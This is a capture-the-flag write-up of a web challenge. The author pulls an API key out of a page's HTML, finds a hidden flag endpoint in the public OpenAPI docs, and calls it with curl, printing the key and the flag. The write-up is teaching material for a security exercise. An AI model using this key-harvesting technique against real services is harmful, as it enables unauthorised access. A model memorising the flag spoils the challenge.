---
title: Gold Hunters
date: 2026-07-06
tags:
- web
- LYKNCTF
---

- **Challenge:** Gold Hunters
- **Category:** Web
- **Flag:** `LYKNCTF{94314bb44c3b436e9ecbe0925b47c12c}`

---

## My initial read / first impressions

The challenge description says:

```text
It looks like they intentionally or unintentionally put some gold in front of your eye. Can you find it?
```

That pretty much screams that something useful is exposed client-side. The phrase "in front of your eye" made me think the solve was probably not going to require anything too deep at first. I wanted to check the HTML, JavaScript, and anything the frontend was shipping to the browser.

Opening the site showed a basic contact form:

```text
Contact us
Send us a message.
```

The form had fields for name, email, and message. Nothing interesting showed up visually, so the next step was looking at the raw page source.

## Finding the exposed key

The HTML had this script tag near the top:

```html
<script>
  window.API_KEY = "t73dgEiUCWKlByZuAdIyPRoN1KfUY6uySNn10C4pl1M";
</script>
```

That is the gold sitting right in front of us.

There was also a bundled frontend script:

```html
<script type="module" crossorigin src="/assets/index-B-T8Q2XM.js"></script>
```

Looking through the JavaScript showed that the contact form only submitted to:

```text
/api/contact
```

The frontend did not actually use the API key anywhere. That made the key even more suspicious, because if it is not needed for the public form, it is probably meant for a hidden or protected API endpoint.

## Checking the API

Submitting to the contact endpoint worked without authentication:

```bash
curl -i -X POST 'http://TARGET/api/contact' \
  -H 'Content-Type: application/json' \
  --data '{"name":"a","email":"a@a.com","message":"test"}'
```

The server returned the stored message:

```json
{
  "id": 1,
  "name": "a",
  "email": "a@a.com",
  "message": "test",
  "created_at": "2026-07-07T12:26:43.628379+00:00"
}
```

At this point, I tried the usual web API recon paths. The useful one was:

```text
/api/docs
```

That opened the FastAPI Swagger UI for the application. The docs pointed to:

```text
/api/openapi.json
```

Fetching that OpenAPI file revealed two important routes:

```text
POST /api/contact
GET  /api/contact
GET  /api/get-flag
```

The `/api/get-flag` route even had this description:

```text
Well done! You found the hidden flag endpoint.
```

So the only missing piece was using the exposed key in the right header.

## Getting the flag

The OpenAPI spec showed that the protected routes expected this header:

```text
x-api-key
```

So I called the hidden endpoint with the key from the page source:

```bash
curl -i 'http://TARGET/api/get-flag' \
  -H 'x-api-key: t73dgEiUCWKlByZuAdIyPRoN1KfUY6uySNn10C4pl1M'
```

The response contained the flag:

```json
{
  "flag": "LYKNCTF{94314bb44c3b436e9ecbe0925b47c12c}"
}
```

## Why this works

The mistake is that the application exposes a real API key directly in the frontend:

```js
window.API_KEY = "..."
```

Anything sent to the browser should be treated as public. Even if the key is not displayed on the rendered page, it is still visible in the HTML response.

The second mistake is that the API documentation is also publicly reachable at `/api/docs`. That makes it very easy to connect the leaked key to the hidden endpoint, because the OpenAPI schema tells us the route name and the expected `x-api-key` header.

So the solve is:

1. View the page source.
2. Copy the exposed `window.API_KEY`.
3. Open `/api/docs` or `/api/openapi.json`.
4. Find `/api/get-flag`.
5. Send the leaked key as `x-api-key`.

## Flag

```text
LYKNCTF{94314bb44c3b436e9ecbe0925b47c12c}
```
